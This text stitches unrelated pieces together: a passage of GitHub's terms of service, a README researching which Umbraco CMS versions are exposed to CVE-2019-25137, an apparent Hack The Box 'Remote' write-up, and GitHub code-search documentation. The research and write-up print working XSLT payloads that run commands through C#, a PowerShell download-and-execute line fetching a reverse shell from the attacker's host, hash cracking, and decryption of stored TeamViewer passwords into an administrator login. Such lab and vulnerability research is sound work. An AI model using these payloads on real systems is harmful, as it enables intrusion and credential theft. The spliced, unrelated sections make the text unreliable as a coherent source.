* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service. If you dispute the matter, contact us through the [GitHub Support portal](https://support.github.com/). You are responsible for providing us with a valid means of payment for paid Accounts. Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

All provisions of this Agreement which, by their nature, should survive termination *will* survive termination — including, without limitation: ownership provisions, warranty disclaimers, indemnity, and limitations of liability.

## [M. Communications with GitHub](#m-communications-with-github)

# **CVE-2019-25137 Affected Version Research**

---

## **CVE-2019-25137 Overview**

CVE-2019-25137 is a XSLT injection vulnerability in Umbraco CMS. The vulnerability is present in the XSLT (Extensive Stylesheet Language Transformations) Visualizer webpage. The vulnerable URI for this webpage is /umbraco/developer/Xslt/xsltVisualize.aspx.

Successful exploitation of the XSLT Visualizer can result in C# code being executed on the targeted system. To exploit the vulnerability, a user requires legitimate administrator credentials to the Umbraco CMS.

The proof of concept for CVE-2019-25137 uses the msxsl:script element. This element allows for additional programming languages to be used in XSLT transformations, such as C#.

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "<additional arguments>"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "<Can be powershell or cmd>"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>

```

The XSLT payload will attempt to execute the following C# code.

```
string cmd = "<additional arguments>";
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName = "<Can be powershell or cmd>";
proc.StartInfo.Arguments = cmd;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.RedirectStandardOutput = true;
proc.Start();
string output = proc.StandardOutput.ReadToEnd();
return output;

```

The C# code is broken down into the following statements - all definitions are documented on Microsoft's website.

| Function | Overview |
| --- | --- |
| System.Diagnostics.Process proc | Provides access to local and remote processes and enables the user to start and stop local system processes, this one is called "proc". |
| proc.StartInfo.FileName | Defines the name of the application the user wants to start (powershell or cmd). |
| proc.StartInfo.Arguments | Defines any additional variables that might be needed by FileName. |
| proc.StartInfo.UseShellExecute | A value indicating whether to use the operating system shell to start the process, this is set as false as either powershell or cmd is used. |
| proc.StartInfo.RedirectStandardOutput | A value that indicates whether the output of an application is written to the StandardOutput stream, this is set as true. |
| proc.Start() | Starts the "proc" process resource and associates it with a Process component. |
| string output = proc.StandardOutput.ReadToEnd() | Performs synchronous read operations on "proc" and redirects it to the "output" variable. |

## **Umbraco Version Analysis**

Since Umbraco is an open source CMS, I obtained different installation versions from their website to determine what versions, both old and new, may still have xsltVisualize.aspx present.

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-releases.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-releases.jpg)

Analysis indicates that the xsltVisualize.aspx file exists in Umbraco CMS version 4.11.8 until version 7.15.10. This file and the whole Development folder is no longer present in versions 8.0.0 and up.

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-8.0.0.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-8.0.0.jpg)

---

## **Testing Umbraco 4.11.8**

To demonstrate that the earliest version is also vulnerable to CVE-2019-25137, I set up a test instance of Umbraco 4.11.8.

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-4.11.8-Version.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-4.11.8-Version.jpg)

Comparing the Umbraco CMS 4.11.8 xsltVisualize.aspx with the one from Umbraco CMS Version 7.12.4 demonstrates that while there are a small amount of differences, the webpages functionality is the same.

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-diff-7.12.4-and-4.11.8.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-diff-7.12.4-and-4.11.8.jpg)

To test the exploit, the user needs to submit the payload within the xsltSelection field.

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/hidden.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/hidden.jpg)

Using the payload provided before, I was able to achieve remote code execution, indicating that this version is also vulnerable. Image below demonstrates whoami being run.

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "whoami"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>

```

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/whoami.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/whoami.jpg)

---

## **Testing Umbraco 7.15.10**

To demonstrate that the most recent version of Umbraco with xsltVisualize.aspx is also vulnerable, I set up a test instance of Umbraco 7.15.10.

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-7.10.15-version.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-7.10.15-version.jpg)

Comparing the Umbraco CMS 7.15.10 xsltVisualize.aspx with the one from Umbraco CMS Version 7.12.4 demonstrates that they are the same.
[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-diff-7.12.4-and-7.15.10.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-diff-7.12.4-and-7.15.10.jpg)

Navigating to the /umbraco/developer/Xslt/xsltVisualize.aspx URI indicates that the file is indeed present.
[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-7.10.15-xlst.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-7.10.15-xlst.jpg)

Using the same payload provided before, I was able to achieve remote code execution again, indicating that this version is also vulnerable. Image below demonstrates whoami being run.

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "whoami"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>

```

[![](/Ickarah/CVE-2019-25137-Version-Research/raw/main/images/umbraco-7.10.15-whoami.jpg)](/Ickarah/CVE-2019-25137-Version-Research/blob/main/images/umbraco-7.10.15-whoami.jpg)

## **Summary**

These examples demonstrates that CVE-2019-25137 is present on Umbraco versions separate from 7.12.4. All versions between 4.11.8 and 7.15.10 contain the vulnerable webpage and therefore should be included in the CVE update. CVE-2019-25137 can be mitigated by removing access to the xsltVisualize.aspx file or updating to the most recent version of Umbraco.

HTB: Remote

![Remote](https://0xdfimages.gitlab.io/img/remote-cover.png)

To own Remote, I’ll need to find a hash in a config file over NFS, crack the hash, and use it to exploit a Umbraco CMS system. From there, I’ll find TeamView Server running, and find where it stores credentials in the registry. After extracting the bytes, I’ll write a script to decrypt them providing the administrator user’s credentials, and a shell over WinRM or PSExec.

That’s a lot of Windows ports, as well as HTTP, FTP, and NSF.

### Website - TCP 80

#### Site

The website is for Acme Widgets:

[![image-20200322144140257](https://0xdfimages.gitlab.io/img/image-20200322144140257.png)](https://0xdfimages.gitlab.io/img/image-20200322144140257.png)
[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200322144140257.png)

There are many pages on the site, but none that are particularly interesting.

#### CMS

There are a few references to [Umbraco](https://umbraco.com/), a content management system (CMS). There’s a CSS link, a Javascript link, and text references near the blog posts:

![image-20200322145102836](https://0xdfimages.gitlab.io/img/image-20200322145102836.png)

Some quick Googling reveals that the admin login page is located at `/Umbraco`, which works here, presented a login prompt:

![image-20200322145218625](https://0xdfimages.gitlab.io/img/image-20200322145218625.png)

I tried some default creds, but didn’t make any progress.

#### Vulnerabilities

Some quick research found [this authenticated code execution vulnerability](https://www.exploit-db.com/exploits/46153) in Umbraco. If I find creds, I’ll come back to this.

### FTP - TCP 21

FTP is open and allows anonymous access. I connected, but the root is empty. I also tested writing, but was didn’t have permission.

### SMB - TCP 445

Typical checks on SMB showed no access to any shares:

```
root@kali# smbclient -N -L //10.10.10.180
session setup failed: NT_STATUS_ACCESS_DENIED

root@kali# smbmap -H 10.10.10.180
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.180
[!] Authentication error on 10.10.10.180

```
### NSF - TCP 2049

NFS is super uncommon on HTB machines, and thus, its being open is definitely worth some attention. `showmount` will give the paths that can be mounted and who can mount them. In this case, it’s named `site_backups` and everyone can access:

```
root@kali# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

```

I’ll mount this to `/mnt` on my host:

```
root@kali# mount -t nfs 10.10.10.180:/site_backups /mnt/

```

Now I have access to what looks like a backup of the web directory:

```
root@kali:/mnt# ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config

```

Poking around a bit, there’s an `.sdf` file in `/App_Data` called `Umbraco.sdf`. `.sdf` files are standard database format files. I don’t know a great way to parse these files, but `strings` shows some interesting results right at the top of the file:

```
root@kali:/mnt/App_Data# strings Umbraco.sdf | head

```

I can guess that there’s an admin account, with email admin@htb.local, and password hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` that is a SHA1. There’s another user, smith, who has a password which is stored using HMACSHA256.

## Shell as IIS

### Access Umbraco Admin Panel

#### Crack Admin Hash

I dropped the admin SHA1 into a file, and ran `hashcat` to crack it:

```
root@kali# cat admin.sha1
b8be16afba8c314ad33d812f22a04991b90e2aaa

root@kali# hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force                                                                                            hashcat (v5.1.0) starting...

It cracks to “baconandcheese”.

#### Login

The username admin doesn’t work, but the username “admin@htb.local” does.

![image-20200322151028207](https://0xdfimages.gitlab.io/img/image-20200322151028207.png)
### Exploit

Typically with a CMS I would look to upload a webshell. In this case, since I already have a potential RCE exploit, I’ll start there.

#### Customize Exploit

The exploit requires some customization to get it working, all of this goes in this section:

```
# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "XXXX";
password="XXXX";
host = "XXXX";

```

I’ll update the `login` to “admin@htb.local”, the `password` to “baconandcheese”, and the `host` to “http://10.10.10.180” (originally I just had the IP, but that leads to an error).

I’ll also need to update the `payload`. It currently launched calc. Obviously I want to change that. I’ll focus on this section (with some added whitespace):

```
{ string cmd = "";
 System.Diagnostics.Process proc = new System.Diagnostics.Process();
 proc.StartInfo.FileName = "calc.exe";
 proc.StartInfo.Arguments = cmd;
 proc.StartInfo.UseShellExecute = false;
 proc.StartInfo.RedirectStandardOutput = true;
 proc.Start();
 string output = proc.StandardOutput.ReadToEnd();
 return output; }

```

I find with things like this that I have the most luck if I run `cmd.exe`. So I’ll change `proc.StartInfo.FileName = "calc.exe"` to `proc.StartInfo.FileName = "cmd.exe"`. Just after that, there’s `proc.StartInfo.Arguments = cmd;`. The variable `cmd` is set right at the beginning, currently to the empty string.

#### Ping POC

As a proof of concept, I’ll set `cmd = "/c ping 10.10.14.19"`. On running, it prints some messages:

```
root@kali# python umbraco_rce_ping.py
Start
[]
End

```

Then there are pings in `tcpdump`:

```
root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes

16:53:33.634668 IP 10.10.14.19 > 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40

```
#### Shell

I’ll update the payload with the PowerShell loader that will download from my host a [Nishang](https://github.com/samratashok/nishang) PowerShell reverse shell and run it. The payload will be:

```
string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.19/shell.ps1')";

```

To break that down, the target exe is still `cmd.exe`. It will run with `/c`, so running the command that follow. PowerShell will start, with `-c` to issue commands that follow. `iex` (shorthand for `Invoke-Expression`) will run whatever string comes back from the rest of the line. The rest of the line will reach out to my host, and download `shell.ps1` (which is then passed to `iex`).

I’ll grab a copy of `Invoke-PowerShellTcp.ps1` (and save it as `shell.ps1`), and add a line at the bottom to execute the shell:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 443

```

Without this line, the harness would load the reverse shell functions into the PowerShell session, and but not use them. Now it will load the functions and then invoke the one I want to call back to me.

I’ll use three windows:

1. Run `python umbraco_rce_iex.py`.
2. A Python web server hosting `shell.ps1`.
3. A `nc` listener (with `rlwrap` for shell arrow keys) to catch the reverse shell.

Run the exploit (it hangs after `[]`):

```
root@kali# python umbraco_rce_iex.py
Start
[]

```

In the web server, I see the GET for `shell.ps1`:

```
root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.180 - - [21/Mar/2020 20:33:14] "GET /shell.ps1 HTTP/1.1" 200 -

```

Then a second later the shell comes back:

```
root@kali# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```
### user.txt

With this shell I can grab `user.txt`. I’m currently running as a user that doesn’t have a desktop, and in fact, there are no non-admin users on this machine:

```
PS C:\users> dir

### Enumeration

Looking at the `tasklist`, one application jumps out as particularly interesting:

```

```

TeamViewer is a remote management software. Since this is the server, it will have credentials used for others to connect into it.

I can get the version by looking in the `\Program Files (x86)\TeamViewer`:

```
PS C:\Program Files (x86)\TeamViewer> ls
    Directory: C:\Program Files (x86)\TeamViewer

Mode                LastWriteTime         Length Name

d-----        2/27/2020  10:35 AM                Version7

```

There is a Metasploit module `post/windows/gather/credentials/teamviewer_passwords`. But since I like to avoid Meterpreter to see what’s going on under the hood, I’ll take a look at the [source](https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/teamviewer_passwords.rb). There’s a list of registry keys, and the one that looks like version 7 is `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`. For each location, it looks for the following values:

* OptionsPasswordAES
* SecurityPasswordAES
* SecurityPasswordExported
* ServerPasswordAES
* ProxyPasswordAES
* LicenseKeyAES

I can take a look at that registry key:

```
PS C:\> cd HKLM:\software\wow6432node\teamviewer\version7
PS HKLM:\software\wow6432node\teamviewer\version7> get-itemproperty -path .

```

`SecurityPasswordAES` is there from the list above. It just dumps a list of integers:

```
PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
255

```
### Decrypt Password

Looking a bit more at the Metasploit code, there’s a decrypt function:

```
def decrypt(encrypted_data)
    password = ""
    return password unless encrypted_data

    password = ""

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new("AES-128-CBC")
    begin
        aes.decrypt
        aes.key = key
        aes.iv = iv
        plaintext = aes.update(encrypted_data)
        password = Rex::Text.to_ascii(plaintext, 'utf-16le')
        if plaintext.empty?
            return nil
        end
    rescue OpenSSL::Cipher::CipherError => e
        print_error("Unable to decrypt the data. Exception: #{e}")
    end

```

It’s using AES128 in CBC mode with a static key and iv. I can easily recreate this in a few lines of Python:

```
#!/usr/bin/env python3

from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")

```

Running it finds a password:

```
root@kali# python3 decrypt_tvpass.py
[+] Found password: !R3m0te!

```
### Shell

That password happens to work for the administrator account on Remote:

```
root@kali# crackmapexec smb 10.10.10.180 -u administrator -p '!R3m0te!'
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:REMOTE) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [+] REMOTE\administrator:!R3m0te! (Pwn3d!)

```

The `(Pwn3d!)` shows this is an admin account, so I should be able to get a shell.

I can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```
root@kali# evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\desktop> whoami
remote\administrator

```

I could also use `psexec.py`:

```
root@kali# psexec.py 'administrator:!R3m0te!@10.10.10.180'
Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation

```

Or `wmiexec.py`:

```
root@kali# wmiexec.py 'administrator:!R3m0te!@10.10.10.180'
Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used

```

From any of these, I can grab the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

